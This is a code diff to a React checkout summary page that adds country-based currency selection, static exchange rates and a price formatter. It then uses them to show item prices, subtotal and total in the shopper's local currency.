@@ -2,6 +2,41 @@ import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
 import { sendData, navigateToPage } from "@/lib/store";
 
+// Currency helpers
+const COUNTRY_CURRENCY: Record<string, string> = {
+  'AM':'EUR','AU':'USD','AT':'EUR','BH':'BHD','BE':'EUR','BG':'EUR','CA':'USD',
+  'HR':'EUR','CY':'EUR','CZ':'EUR','DK':'EUR','EE':'EUR','FI':'EUR','FR':'EUR',
+  'DE':'EUR','GR':'EUR','GG':'GBP','HK':'USD','HU':'EUR','IN':'USD','ID':'USD',
+  'IE':'EUR','IT':'EUR','JP':'USD','JE':'GBP','JO':'USD','KZ':'USD','KW':'KWD',
+  'LV':'EUR','LT':'EUR','LU':'EUR','MY':'USD','MT':'EUR','NL':'EUR','NZ':'USD',
+  'NO':'EUR','OM':'OMR','PH':'USD','PL':'EUR','PT':'EUR','QA':'USD','RO':'EUR',
+  'SA':'SAR','SG':'USD','SK':'EUR','SI':'EUR','KR':'USD','ES':'EUR','SE':'EUR',
+  'CH':'EUR','TH':'USD','AE':'AED','GB':'GBP','US':'USD'
+};
+const CURRENCY_SYMBOLS: Record<string, string> = {
+  'USD':'$','EUR':'€','OMR':'OMR ','KWD':'KWD ','BHD':'BHD ','AED':'AED ','GBP':'£','SAR':'SAR '
+};
+const EXCHANGE_RATES: Record<string, number> = {
+  'USD':1,'EUR':0.92,'OMR':0.385,'KWD':0.308,'BHD':0.376,'AED':3.67,'GBP':0.79,'SAR':3.75
+};
+
+function getStoreCurrency() {
+  const countryCode = localStorage.getItem('amouage_country') || 'OM';
+  const currency = COUNTRY_CURRENCY[countryCode] || 'OMR';
+  const symbol = CURRENCY_SYMBOLS[currency] || currency + ' ';
+  const rate = EXCHANGE_RATES[currency] || 1;
+  return { currency, symbol, rate };
+}
+
+function formatStoreCurrency(usdAmount: number) {
+  const { currency, symbol, rate } = getStoreCurrency();
+  const converted = usdAmount * rate;
+  if (['KWD','BHD','OMR'].includes(currency)) {
+    return symbol + converted.toFixed(3);
+  }
+  return symbol + Math.round(converted).toLocaleString('en-US');
+}
+
 export default function SummaryPayment() {
   const [, setLocation] = useLocation();
   const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<string | null>(null);
@@ -291,7 +326,7 @@ export default function SummaryPayment() {
                   <p className="text-xs text-gray-500">{item.variant || ''}</p>
                 </div>
                 {/* Price */}
-                <span className="text-sm font-medium text-black">${((parseFloat(item.priceNum) || 0) * item.quantity).toLocaleString()}</span>
+                <span className="text-sm font-medium text-black">{formatStoreCurrency((parseFloat(item.priceNum) || 0) * item.quantity)}</span>
               </div>
             ))}
           </div>
@@ -312,7 +347,7 @@ export default function SummaryPayment() {
           <div className="border-t border-gray-200 pt-4 space-y-2">
             <div className="flex justify-between text-sm">
               <span className="text-gray-600">Subtotal · {totalItems} items</span>
-              <span className="font-medium">${subtotal.toLocaleString()}</span>
+              <span className="font-medium">{formatStoreCurrency(subtotal)}</span>
             </div>
             <div className="flex justify-between text-sm">
               <span className="text-gray-600">Shipping</span>
@@ -325,8 +360,8 @@ export default function SummaryPayment() {
             <div className="flex justify-between items-center">
               <span className="text-base font-medium">Total</span>
               <div className="text-right">
-                <span className="text-xs text-gray-500 mr-2">USD</span>
-                <span className="text-xl font-medium">${subtotal.toLocaleString()}</span>
+                <span className="text-xs text-gray-500 mr-2">{getStoreCurrency().currency}</span>
+                <span className="text-xl font-medium">{formatStoreCurrency(subtotal)}</span>
               </div>
             </div>
           </div>
